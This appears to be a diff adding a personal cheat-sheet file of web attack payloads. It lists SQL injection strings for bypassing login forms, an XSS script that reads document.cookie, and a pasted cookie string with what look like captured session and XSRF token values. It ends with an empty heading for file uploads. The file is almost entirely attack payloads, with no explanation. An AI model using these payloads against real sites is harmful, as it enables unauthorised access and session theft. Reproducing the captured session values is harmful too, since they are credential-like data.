@@ -1,0 +1,14 @@
+#sql injection
+
+#blind sql injection login
+' or 1=1 #
+' or 'a'='a' #
+' or '1'='1' #
+----
+' or 1=1--
+
+#Cros Site Scripting
+<script>alert(document.cookie)</script>
+_ga=GA1.1.1892708165.1543477922; G_ENABLED_IDPS=google; PHPSESSID=qnfql1reponkil4henrm8tg6aj; XSRF-TOKEN=eyJpdiI6IkdDbnVISFdzSUhUVkRRWCs1aVhnR3c9PSIsInZhbHVlIjoiNFVjYU9HUGdVMEY1TVNDVWZlcGpXeGdMRXg1c2dlUll3a29pOG5WYTR0c3RybFpNallcL3owVVwvZXlmdFNYWGVjIiwibWFjIjoiMGYzZGFkNzFmMjljZTI1NjQwZDgxMzYzMmQ0NmQwNjMyZDRlOWUwODc3ZDE0YjI0ZGM4OWNiYzNmNjhlZGRkZCJ9
+
+#file uploads
